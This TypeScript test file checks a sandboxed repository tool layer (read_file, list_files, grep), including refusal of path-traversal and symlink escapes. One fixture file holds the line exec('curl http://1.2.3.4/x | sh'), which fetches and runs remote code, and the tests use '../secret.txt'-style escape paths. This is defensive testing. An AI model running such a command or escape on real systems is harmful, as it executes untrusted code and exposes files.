import assert from 'node:assert/strict';
import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { after, before, describe, it } from 'node:test';
import { LIMITS, RepoTools } from '../repo-tools.ts';

let base: string;
let root: string;
let tools: RepoTools;

before(async () => {
  base = await mkdtemp(path.join(os.tmpdir(), 'tools-test-'));
  root = path.join(base, 'repo');
  await mkdir(path.join(root, 'src'), { recursive: true });
  await mkdir(path.join(root, 'node_modules', 'dep'), { recursive: true });
  await writeFile(path.join(base, 'secret.txt'), 'outside the repo\n');
  await writeFile(path.join(root, 'README.md'), '# Demo\nRun ./setup.sh first.\n');
  await writeFile(path.join(root, 'src', 'index.js'), "const { exec } = require('child_process');\nexec('curl http://1.2.3.4/x | sh');\n");
  await writeFile(path.join(root, 'node_modules', 'dep', 'index.js'), 'exec("ignored")\n');
  await writeFile(path.join(root, 'blob.bin'), Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0, 1, 2]));
  await writeFile(path.join(root, 'long.txt'), Array.from({ length: LIMITS.readLines + 50 }, (_, i) => `line ${i + 1}`).join('\n'));
  await symlink(path.join(base, 'secret.txt'), path.join(root, 'link.txt'));
  tools = new RepoTools(root);
});

after(async () => {
  await rm(base, { recursive: true, force: true });
});

describe('RepoTools', () => {
  it('reads a file with line numbers', async () => {
    const out = await tools.call('read_file', { path: 'README.md' });
    assert.match(out, /README\.md \(lines 1-3 of 3\)/);
    assert.match(out, /\s+2 {2}Run \.\/setup\.sh first\./);
  });

  it('pages through long files', async () => {
    const first = await tools.call('read_file', { path: 'long.txt' });
    assert.match(first, new RegExp(`call read_file with start_line ${LIMITS.readLines + 1}`));
    const second = await tools.call('read_file', JSON.stringify({ path: 'long.txt', start_line: LIMITS.readLines + 1 }));
    assert.match(second, new RegExp(`line ${LIMITS.readLines + 50}$`, 'm'));
  });

  it('refuses paths outside the repository', async () => {
    for (const p of ['../secret.txt', path.join(base, 'secret.txt'), 'src/../../secret.txt']) {
      const out = await tools.call('read_file', { path: p });
      assert.match(out, /outside the repository|no such file/, p);
      assert.doesNotMatch(out, /outside the repo\n/);
    }
  });

  it('refuses a symlink that points outside', async () => {
    const out = await tools.call('read_file', { path: 'link.txt' });
    assert.match(out, /outside the repository/);
  });

  it('does not follow symlinks when listing or searching', async () => {
    const list = await tools.call('list_files', {});
    assert.doesNotMatch(list, /link\.txt/);
    const hits = await tools.call('grep', { pattern: 'outside the repo' });
    assert.equal(hits, 'No matches.');
  });

  it('greps with file and line, skipping node_modules and binaries', async () => {
    const out = await tools.call('grep', { pattern: 'exec\\(' });
    assert.match(out, /^src\/index\.js:2: exec\('curl http:\/\/1\.2\.3\.4\/x \| sh'\);$/m);
    assert.doesNotMatch(out, /node_modules/);
  });

  it('lists files with a filter', async () => {
    const out = await tools.call('list_files', { filter: '.js' });
    assert.equal(out.trim(), `src/index.js ${Buffer.byteLength("const { exec } = require('child_process');\nexec('curl http://1.2.3.4/x | sh');\n")}`);
  });

  it('says a binary file is binary', async () => {
    const out = await tools.call('read_file', { path: 'blob.bin' });
    assert.match(out, /binary file/);
  });

  it('answers unknown tools and bad arguments with text, not a throw', async () => {
    assert.match(await tools.call('bash', { command: 'sh setup.sh' }), /no tool called "bash"/);
    assert.match(await tools.call('read_file', '{not json'), /could not read the arguments/);
    assert.match(await tools.call('read_file', {}), /"path" is required/);
    assert.match(await tools.call('grep', { pattern: '(' }), /not a valid regular expression/);
  });
});
